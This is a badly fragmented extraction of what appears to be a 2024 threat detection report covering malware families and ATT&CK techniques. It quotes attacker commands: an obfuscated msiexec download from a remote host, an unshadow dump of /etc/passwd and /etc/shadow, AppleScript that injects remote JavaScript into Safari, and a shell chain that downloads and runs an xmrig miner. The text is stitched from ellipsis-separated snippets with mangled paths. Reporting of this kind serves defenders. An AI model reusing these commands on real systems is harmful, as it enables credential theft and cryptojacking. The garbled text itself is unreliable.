...
AI for defenders
Enough about bad guys, lets talk about the many ways that AI is
...
5000x3533 technology wallpaper (1\)
.exe
...
71
2024 Threat Detection Report
file bearing the victims search query as its name (for example: this\-is\-
...
with its content.
The query\-based binary acts as an installer for Yellow Cockatoos 
...
Yellow Cockatoos initial access can be difficult to prevent. To harden
...
and low\-reputation domains (e.g .tk, .top, and \*
.gg) as well as
...
Do you C what IC?
Despite the shift to direct delivery of the Update.
js file, we continued 
...
73
2024 Threat Detection Report
instead of the typical filename Chrome.Update.zip, SocGholish would 
...
for .
js and .
jse files. To remove SocGholish components, stop any malicious 
...
into the AppDataRoaming folder, that would sometimes spawn the 
...
MSI, led to increasingly obfuscated NW.
js (formerly node\-webkit) 
applications including compiled JavaScript. The application, installed 
in C:
UsersAppDataRoaming, established persistence 
through a LNK file placed in C:
UsersAppDataRoaming
MicrosoftWindowsStart MenuProgramsStartup or a registry 
key entry in HKEY \_ CURRENT \_ USERSoftwareMicrosoftWindows
CurrentVersionRun.
For those not familiar, NW.
js apps include many boilerplate runtime files, 
...
package.
json and the file pointed to by the main: variable in that file. This 
...
While the NW.
js runtime binary is not malicious on its own, the application 
...
UsersAppDataRoaming. Throughout 2022 and the first 
half of 2023, the ChromeLoader NW.
js runtime binary matched the name 
...
All of this NW.
js activity sets the stage for installing a malicious 
...
malicious code wont be installed at a later date.
77
2024 Threat Detection Report
TAKE
ACTION
...
With so many threats facing us, USB worms arent often the highest 
...
81
2024 Threat Detection Report
Qbot is usually deployed as just one stage of an adversarys playbook, 
...
DAT, or JPG files.
Starting in July, Qbot detections decreased dramaticallyin line with 
...
On September 22, 2023, Deutsche Telekom CERTs CTI team shared 
...
83
2024 Threat Detection Report
EpilogueIt remains to be seen what a Qbot return might look like. On December 
...
this command: cmd.exe qVR TYPE QLiet.sAV\|Cmd
...
MsIEXeC qUieT AjHodmv\=Yn iXLspV\=rSbH fV HtTp:
Fnx\[
.
]
WF:8080BKCFLqnP6C9zlfVeygFfdAE\=
Diving into the DLL
...
ProgramData. The DLL name is two\-
to\-eight random characters, followed by a three\-character file extension. 
Extensions weve observed include .tmp, .etl, .log, and others. The 
...
on activity including BumbleBee, Cobalt Strike, and IcedID.Microsoft additionally reported that Raspberry Robin was observed 
...
search through an adversary\-controlled site such as searchesmia\[
.
]com 
...
Chromes and Microsoft Edges ExtensionInstallAllowList and 
...
Whats included in this section? 
Weve written extensive analysis of 15 ATT\&CK techniques and
...
and more.
PowerShell (T1059\.001\)
AnalysisWhy do adversaries use PowerShell?
...
tools on a target system.How do adversaries use PowerShell?
...
93
2024 Threat Detection Report
PowerShells versatility is on display in many of the phishing campaigns 
...
atomic tests to validate your coverage 
Considering the upticks weve seen in using PowerShell to tamper with 
...
AnalysisWhy do adversaries use
Windows Command Shell?
...
P^owershell. Daniel Bohannon has covered these obfuscation 
methods in depth.
...
the relatively mundane but interesting %windir%system32drivers
etchosts to source code files for sensitive applications. Combine the 
...
Moving beyond the command shells built\-in commands, cmd.exe can 
...
of Impackets WMIexec module.
Windows Management 
Instrumentation (T1047\)
AnalysisWhy do adversaries use WMI?
...
will focus on the former. On the server side, wmiprvse.exeor the WMI 
...
This is important to remember because if youre looking at suspicious 
...
system or environment. Weve seen adversaries use WMIC to:
...
Weve also run into adversaries leveraging XSL Script Processing, which 
...
Regardless of whether its a single endpoint, an endpoint in an Active 
...
atomic tests to validate your coverage 
Theres no simple strategy for limiting the effectiveness of adversarial
...
Cloud Accounts (T1078\.004\)
AnalysisWhy do adversaries abuse
cloud accounts?
...
cloud accounts?
Its important to note that credentials in the cloud extend beyond 
...
AnalysisWhy do adversaries obfuscate files 
and information?
...
String]
:
:Join() method to combine characters, which is functionally 
...
. 
The plus signs here are string concatenation, which weve addressed. 
...
On most systems, the public environmental variable will be C:
Users
...
characters (e.g \` or , depending on the context, and ^, respectively) 
...
Email Forwarding
Rule (T1114\.003\)
AnalysisWhy do adversaries leverage email 
forwarding rules?
...
They also do a far better job of passing a security\-savvy users sniff test 
OVERALL
RANK
 OF CUSTOMERS
AFFECTED
...
.), a semicolon (;) or a single 
letter. We also saw repetitive rule names such as aaaa or .
.
.
.
.
...
2\.Its easier and faster than creating an actual email forwarding rule.
...
5\.Sent messages are immediately moved to a different users folder
or deleted.
...
detect are:
T1003\.008: etcpasswd and etcshadow: Adversaries dumping
the contents of etcpasswd and etcshadow to enable offline 
password cracking
In todays Linux operating systems, youll typically find user account 
information, including password hashes, stored in a tandem of etc
passwd and etcshadow files. Notably, the etcshadow file, where
...
password cracking. It merges information from etcpasswd and etc
shadow into a format tailor\-made for password cracking tools like John 
the Ripper. Heres a quick command example to illustrate how it works:
...
\# usrbinunshadow etcpasswd etcshadow \>
tmpcrack.password.db
116
2024 Threat Detection Report
...
lateral movement.T1003\.003: NTDS: NTDSUtil dumping ntds.dit (Active Directory)When adversaries engage in malicious activities, they strategically 
...
It is typically located within %SystemRoot%NTDSNtds.dit on the 
...
Note: LSASS Memory didnt quite make the top 10 this year, but our 
...
is unavailable.Other notable techniques weve seen: 
...
Rundll32 (T1218\.001\)
AnalysisWhy do adversaries use Rundll32?
...
malicious purposes 
Adversaries also abuse legitimate DLLs and their export functions. Weve 
...
Ingress Tool Transfer 
(T1114\.003\)
AnalysisWhy do adversaries use Ingress
Tool Transfer?
...
Beyond C2 tools, its not unusual to see adversaries using remote 
...
taking advantage of to move their tools around.Another native system binary commonly abused by adversaries is 
...
arbitrary files. 
The LOLBAS project is a great resource and searchable database thats 
...
While we havent observed it first hand, numerous threats have reportedly 
...
123
2024 Threat Detection Report
A behavior thats inherently suspicious in the context of 
...
Rename System Utilities 
(T1036\.003\)
AnalysisWhy do adversaries rename
system utilities?
...
system utilities? 
There isnt much variance in the ways that adversaries rename system 
...
payloads, establish persistence, or perform other malicious actions.The following are the top 10 most commonly renamed utilities detected by 
Red Canary in 2023:
...
atomic tests to validate your coverage 
Theres no simple way to prevent an adversary from changing the outwardly 
...
with Microsofts latest installer format, MSIX.
Installer Packages
(T1546\.016\)
AnalysisWhat is MSIX?
...
and execution along with AppXMetadataCodeIntegrity.cat (if there are 
...
Valve.Steam \_ 3\.0\.
7
.3 \_ x64 \_ \_ cvpb331a1f8hw (Note: ResourceId 
...
signature from the packages AppxSignature.p7x. Extracting the 
...
Example output:
(Get\-AuthenticodeSignature AppxSignature.p7x)
.SignerCertificate \|Select\-Object \-Property Thumbprint, Subject
...
also have the following file: AppxMetadataCodeIntegrity.cat. This 
...
.3\.3 \- Code Signing
1\.3\.6\.1\.4\.1\.311\.
76\.3\.1 \- Windows Store
1\.3\.6\.1\.4\.1\.311\.
76\.5\.100 \- First\-Party Store Software 
130
2024 Threat Detection Report
...
Microsoft Store third\-party appA third\-party Microsoft Store app is any non\-bundled, non\-Microsoft app 
...
76\.3\.1 \- Windows Store
1\.3\.6\.1\.4\.1\.311\.
76\.5\.200 \- Third\-Party Store Software
...
131
2024 Threat Detection Report
Developer\-signed appsA developer\-signed app is an app package where AppxSignature.p7x
...
the 1\.3\.6\.1\.4\.1\.311\.
76\.3\.1 (Windows Store) OID. Every malicious
...
132
2024 Threat Detection Report
Suspicious MSIX package triageWhen analyzing a suspicious MSIX package, it is easy to get overwhelmed 
...
means that there will be a config.
json, which indeed there is.
...
TAKE
ACTION
From an adversarys perspective though, delivering malicious MSIX 
packages is not without its risks:
 
The installation artifacts must be installed to disk, so theyre
...
Nearly every instance of a malicious MSIX package weve encountered 
...
AppxManifest.xml to persist a shortcut for the app package to the users 
...
The Microsoft\-Windows\-AppXDeploymentServerOperational log
...
Microsoft\-Windows\-CodeIntegrityOperational event log:
...
from location Steam\-x64\.msix failed.NOTE: For additional information, look for \[ActivityId] 
4856f352\-3f24\-0001\-fbd6\-5948243fda01 in the Event Log or 
use the command lineGet\-AppPackageLog 
\-ActivityID 4856f352\-3f24\-0001\-fbd6\-5948243fda01At line:1 char:1\+ Add\-AppPackage \-Path Steam\-x64\.msix
\+ \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~
...
AnalysisWhy do adversaries abuse kernel 
...
that should autostart, such as etcmodules and libmodules\-load.d
. 
...
ConditionDirectoryNotEmpty\=\|libmodules\-load.d
...
ConditionDirectoryNotEmpty\=\|runmodules\-load.d
140
2024 Threat Detection Report
If youd like to read about in\-the\-wild examples of kernel module
...
https:github.comyaoyumengadore\-ng 
 
https:github.commncoppolasuterusu 
 
https:github.comm0nadDiamorphine
TAKE
ACTION
...
2\.Dont give containers excessive permissions. Privileged containers or 
...
gain access to the host systems resources.
Escape to Host
(T1611\)
AnalysisWhat is a container?
...
For instance, CVE\-2022\-23648 exposes a vulnerability in containerd
s 
...
mount sensitive paths (e.g root
.ssh) and gain credentials that
...
varrundocker.sock). Developers use this to connect to the Docker 
...
(T1620\)
AnalysisWhy do adversaries abuse reflective 
code loading?
...
Keenly aware of the defenders upper hand here, adversaries leverage 
...
Note: If youre interested in learning more about Mach\-O files, Aidan 
...
the \-bundle flag in gcc or by setting the executable Mach\-Os filetype 
...
When NSLinkModule is called, the modules image is written to disk at a 
...
Note that this is just a test, and wed expect the adversary to fetch the 
...
Lazarus
Advanced tradecraft
To our knowledge, adversaries havent managed to circumvent these APIs 
...
Chesters work successfully accomplishes these goals, and we can 
...
capabilities. Additionally, two of these variations are distinct from Dylds 
...
atomic tests to validate your coverageBasic
...
Advanced 
However, as weve cited above: research published in January 2023 
...
150
2024 Threat Detection Report
Adversaries continue to abuse macOSs native 
...
process communication (IPC) at the command line via the usrbin
osascript LOOBin. 
FEATURED 
TECHNIQUE
151
...
The NSAppleScriptNSUserAppleScriptTask APIs and OSAKit 
...
Next, well go through some examples of adversaries leveraging each of 
these variations. 
Variation 1: osascript 
This first variation is characterized by executing AppleScript code in\-
line or from a file or IPC via the usrbinosascript LOOBin. It typically 
...
detect.
In the most simple case, if an adversary needs to grab the users login 
...
samples doing this). This will be executed via usrbinosascript in 
script form as well.
global \_ pid
...
; pidDiv.innerHTML \= 
\& \_ pid \& ; document.getElementsByTagName(body)
\[0]
.
appendChild(pidDiv)
; in current tab of first window
tell application Safari to do JavaScript 
var js \_ script \= document.createElement(script)
; js \_
script.type \= textjavascript
; js \_ script.src \= script \_
to \_ inject
; document.getElementsByTagName(head)
\[0]
.
appendChild(js \_ script)
; in current tab of first window
end if
end if
end if
...
154
2024 Threat Detection Report
Furthermore, OSX.DarthMiner (a RAT) leverages AppleScript to 
...
AppleScriptwhich we also discussed at length in our webinar. 
Variation 2: NSAppleScript and OSAKit 
Here were referring to the programmatic execution of AppleScript via the 
NSAppleScript NSUserAppleScriptTask API and OSAKit framework. 
The functions youll largely be concerned with include:
NSAppleScript
...
initialize.plist http:
XX.XXX.XXX.XXXcom.proxy.initialize.
plist launchctl load \-w com.apple.rig.plist launchctl load 
\-w com.proxy.initialize.plist cd UsersShared curl \-o 
config.
json http:
XX.XXX.XXX.XXXconfig.
json curl \-o xmrig 
http:
XX.XXX.XXX.XXXxmrig chmod \+x .xmrig rm \-rf .
xmrig2 rm \-rf .config2\.
json .xmrig \-c config.
json \&
155
2024 Threat Detection Report
In 2017, the Snake trojan abused AppleScripts ability to execute
code as the root user. By abusing the do shell script
s with 
...
void \-\[AppDelegate AddLoginScript]
(void \* self, void \* \_
cmd) {
...
https:
 \& domain \& agentsscriptsscreen.applescript)
do shell script osacompile \-x \-e \& payload \& \-o \& 
quoted form of tempApp
set targetDest to (getPathForBundleId(appID)
) \& Contents
MacOS
set targetFiles to {tempAppFile, chkdsAppFile}
Variation 3: Applets 
Applets, for all intents and purposes, are apps. Simply put, theyre 
...
understand is demonstrated by XCSSETs procedures.
...
Well point the reader to the aevt \_ decompile tool developed by 
SentinelOnes Phil Stokes if you happen to come across any examples.
...
TAKE
ACTION
But, scroll down and youre given an idea of what the adversary 
is doing here.
161
2024 Threat Detection Report
...
This report wouldnt be possible without all of you!
